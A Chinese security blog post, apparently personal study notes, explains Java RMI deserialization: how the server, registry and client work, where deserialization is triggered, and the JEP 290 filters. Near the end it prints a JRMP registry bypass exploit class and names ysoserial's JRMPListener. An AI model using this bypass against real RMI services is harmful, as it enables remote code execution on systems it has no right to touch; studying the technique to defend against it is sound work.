@@ -1,0 +1,626 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="随手记得笔记.jpg 参考b站白日梦组长 流程原理    代码示例服务端&amp;注册中心很少有人会把这两个分开放 官方文档： 出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。 IRemoteObj.java: 123456789package org.example;import">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024&#x2F;03&#x2F;01：java反序列化：RMI">
+<meta property="og:url" content="http://example.com/2024/02/29/javarmi/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="随手记得笔记.jpg 参考b站白日梦组长 流程原理    代码示例服务端&amp;注册中心很少有人会把这两个分开放 官方文档： 出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。 IRemoteObj.java: 123456789package org.example;import">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/02/29/javarmi/rmi.png">
+<meta property="og:image" content="http://example.com/2024/02/29/javarmi/rmi2.png">
+<meta property="og:image" content="http://example.com/2024/02/29/javarmi/passby1.png">
+<meta property="article:published_time" content="2024-02-29T13:54:02.000Z">
+<meta property="article:modified_time" content="2024-03-28T14:59:42.143Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/02/29/javarmi/rmi.png">
+  
+  
+  
+  <title>2024/03/01：java反序列化：RMI - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="2024/03/01：java反序列化：RMI"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-02-29 21:54" pubdate>
+          February 29, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.8k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          49 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">2024/03/01：java反序列化：RMI</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>随手记得笔记.jpg</p>
+<p>参考b站白日梦组长</p>
+<h2 id="流程原理"><a href="#流程原理" class="headerlink" title="流程原理"></a>流程原理</h2><img src="/2024/02/29/javarmi/rmi.png" srcset="/img/loading.gif" lazyload class="">
+
+<img src="/2024/02/29/javarmi/rmi2.png" srcset="/img/loading.gif" lazyload class="">
+
+<h3 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h3><h4 id="服务端-amp-注册中心"><a href="#服务端-amp-注册中心" class="headerlink" title="服务端&amp;注册中心"></a>服务端&amp;注册中心</h4><p>很少有人会把这两个分开放</p>
+<p>官方文档：</p>
+<p>出于安全原因，应用程序只能绑定或取消绑定到在同一主机上运行的注册中心。这样可以防止客户端删除或覆盖服务器的远程注册表中的条目。但是，查找操作是任意主机都可以进行的。</p>
+<p>IRemoteObj.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br><span class="hljs-comment">//这是服务端和客户端都要有的接口</span><br></code></pre></td></tr></table></figure>
+
+<p>RemoteObjlmpl:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjlmpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjlmpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;<br>       <span class="hljs-comment">// super();</span><br>       <span class="hljs-comment">//如果不继承UnicastRemoteObject类，则需要手工初始化远程对象，在远程对象的构造方法的调用UnicastRemoteObject.exportObject()静态方法</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//这是服务端实现的远程调用类</span><br></code></pre></td></tr></table></figure>
+
+<p>RemoteServer:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjlmpl</span>();<br>        <span class="hljs-comment">//创建远程对象，这里会完成一些跟网络请求相关的操作：</span><br>        <span class="hljs-comment">//1.会初始化一个类LiveRef，保存ip和一个随机端口，在之后不断封装调用</span><br>        <span class="hljs-comment">//2.封装的LiveRef会放在在UnicastServerRef父类UnicastRef里，通过动态代理创建stub，stub会放在注册中心让客户端拿（注意这个stub是远程调用类的stub）</span><br>        <span class="hljs-comment">//3.创建socket，多开线程，注意真正的代码逻辑的线程和网络请求的线程是独立的</span><br>        <span class="hljs-comment">//4.最后会创建DGCImpl对象，用于垃圾回收，会创建对应的stub，skel</span><br>        <br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<span class="hljs-comment">//注册中心，默认端口1099</span><br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>,remoteObj);<span class="hljs-comment">//绑定到注册中心</span><br>        <span class="hljs-comment">//1.创建一个LiveRef再塞进UnicastServerRef里，与上类似</span><br>        <span class="hljs-comment">//2.初始化stub，这个stub是RegistryImpl_stub，然后创建skeleton</span><br>        <span class="hljs-comment">//3.大部分步骤与上相同</span><br>        <span class="hljs-comment">//4.最后用个hashtable完成绑定（bind）操作</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><p>IRemoteObj.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>rmiclient.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">rmiclient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        remoteObj.sayHello(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        <span class="hljs-comment">//1.客户端创建LiveRef，UnicastRef，根据host端口生成RegistryImpl_Stub，通过其查找注册中心远程对象</span><br>        <span class="hljs-comment">//2.客户端UnicastRef发起请求通信，从注册中心获取结果，异常时对输入流反序列化；没有异常的话，就正常返回RegistryImpl_Stub#lookup，获取数据流后反序列化，获得远程对象的动态代理对象RemoteObjStub</span><br>        <span class="hljs-comment">//3.注册中心根据Skel的不同调用对应的dispatch方法，那这里就会调用RegistryImpl_Skel#dispatch，这个方法有很多反序列化点</span><br>        <span class="hljs-comment">//4.在客户端调用了lookup，注册中心根据dispatch的逻辑，服务端会传递代理对象而不是远程对象本身（通过ConnectionOutputStream序列化，会调用replaceObject替换为动态代理对象）</span><br>        <span class="hljs-comment">//5.客户端远程方法调用，最后会调用UnicastRef里一个重载的invoke，它调用executeCall，存在反序列化点；invoke函数也可能调用存在反序列化点的unmarshalValue</span><br>        <span class="hljs-comment">//6.远程方法调用时服务端调用UnicastServerRef#dispatch，存在unmarshalValue函数</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="关于DGC"><a href="#关于DGC" class="headerlink" title="关于DGC"></a>关于DGC</h3><p>前面简要提及了客户端、服务端、注册中心调用流程的反序列化</p>
+<p>DGC的Stub会在发布远程对象时自动生成，分别是DGCClient的EndpointEntry的构造函数里和DGCImpl静态代码块里</p>
+<p>DGC客户端每次调用dirty时都有可能被DGC服务端攻击，8u141会有过滤器</p>
+<p>DGC服务端调用dirty时也存在反序列化，DGC服务端可能被客户端攻击</p>
+<h3 id="触发点总结"><a href="#触发点总结" class="headerlink" title="触发点总结"></a>触发点总结</h3><h4 id="攻击客户端"><a href="#攻击客户端" class="headerlink" title="攻击客户端"></a>攻击客户端</h4><p>RegistryImpl_Stub#lookup-&gt;注册中心攻击客户端<br>DGCImpl_Stub#dirty-&gt;服务端攻击客户端<br>UnicastRef#invoke-&gt;服务端攻击客户端<br>StreamRemoteCall#executeCall-&gt;服务端/注册中心攻击客户端</p>
+<h4 id="攻击服务端"><a href="#攻击服务端" class="headerlink" title="攻击服务端"></a>攻击服务端</h4><p>UnicastServerRef#dispatch-&gt;客户端攻击服务端<br>DGCImpl_Skel#dispatch-&gt;客户端攻击服务端</p>
+<h4 id="攻击注册中心"><a href="#攻击注册中心" class="headerlink" title="攻击注册中心"></a>攻击注册中心</h4><p>RegistryImpl_Skel#dispatch-&gt;客户端/服务端攻击注册中心</p>
+<h2 id="高版本绕过"><a href="#高版本绕过" class="headerlink" title="高版本绕过"></a>高版本绕过</h2><h4 id="EP290"><a href="#EP290" class="headerlink" title="EP290"></a>EP290</h4><p>8u121之后，安全机制JEP290对RMI进行修复：</p>
+<p>1.限制服务端和注册中心必须在同一host，这俩被强制绑定了</p>
+<p>2.RegistryImpl_Skel里面的对象反序列化时会进行白名单校验</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (String.class == clazz<br>                 || java.lang.Number.class.isAssignableFrom(clazz)<br>                 || Remote.class.isAssignableFrom(clazz)<br>                 || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)<br>                 || UnicastRef.class.isAssignableFrom(clazz)<br>                 || RMIClientSocketFactory.class.isAssignableFrom(clazz)<br>                 || RMIServerSocketFactory.class.isAssignableFrom(clazz)<br>                 || java.rmi.activation.ActivationID.class.isAssignableFrom(clazz)<br>                 || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;<br>             <span class="hljs-keyword">return</span> ObjectInputFilter.Status.ALLOWED;<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-keyword">return</span> ObjectInputFilter.Status.REJECTED;<br>         &#125;<br></code></pre></td></tr></table></figure>
+
+<p>3.DGCImpl_Skel和DGCImpl_Stub里面的对象反序列化时会进行白名单校验</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> (clazz == ObjID.class ||<br>                 clazz == UID.class ||<br>                 clazz == VMID.class ||<br>                 clazz == Lease.class)<br>                 ? ObjectInputFilter.Status.ALLOWED<br>                 : ObjectInputFilter.Status.REJECTED;<br></code></pre></td></tr></table></figure>
+
+<p>此时如何不受限制攻击客户端：</p>
+<p>利用JRMP层的StreamRemoteCall#executeCall，由于触发点不在两个Impl里，可以直接绕过过滤</p>
+<h4 id="实施"><a href="#实施" class="headerlink" title="实施"></a>实施</h4><p>流程如下：</p>
+<img src="/2024/02/29/javarmi/passby1.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>构造恶意对象，让注册中心发起dirty请求</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMPRegistryExploit</span> &#123;   <br>	<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">RegistryImpl_Stub</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> (RegistryImpl_Stub) LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>        lookup(registry);<span class="hljs-comment">//重写lookup</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lookup</span><span class="hljs-params">(RegistryImpl_Stub registry)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">RemoteObjectClass</span> <span class="hljs-operator">=</span> registry.getClass().getSuperclass().getSuperclass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">refField</span> <span class="hljs-operator">=</span> RemoteObjectClass.getDeclaredField(<span class="hljs-string">&quot;ref&quot;</span>);<br>        refField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> (UnicastRef) refField.get(registry);<br><br>        Operation[] operations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.lang.String list()[]&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Operation</span>(<span class="hljs-string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;<br><br>        <span class="hljs-type">RemoteCall</span> <span class="hljs-variable">var2</span> <span class="hljs-operator">=</span> ref.newCall(registry, operations, <span class="hljs-number">2</span>, <span class="hljs-number">4905912898345647071L</span>);<br><br>        <span class="hljs-type">ObjectOutput</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> var2.getOutputStream();<br><br>        var3.writeObject(genEvilJRMPObj());<br>        ref.invoke(var2);<br><br>    &#125;<br>    <br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">genEvilJRMPObj</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">LiveRef</span> <span class="hljs-variable">liveRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LiveRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjID</span>(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">TCPEndpoint</span>(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">7777</span>), <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">unicastRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnicastRef</span>(liveRef);<br>        <span class="hljs-keyword">return</span> unicastRef;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这样受害者成了JRMP客户端导致被攻击</p>
+<p>恶意服务端可直接用ysoserial/exploit/JRMPListener</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/04/2024osuctf/" title="2024/03/04：2024osuctf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2024/03/04：2024osuctf</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/01/11/jndi/" title="2024/01/11：java：JDNI注入">
+                        <span class="hidden-mobile">2024/01/11：java：JDNI注入</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
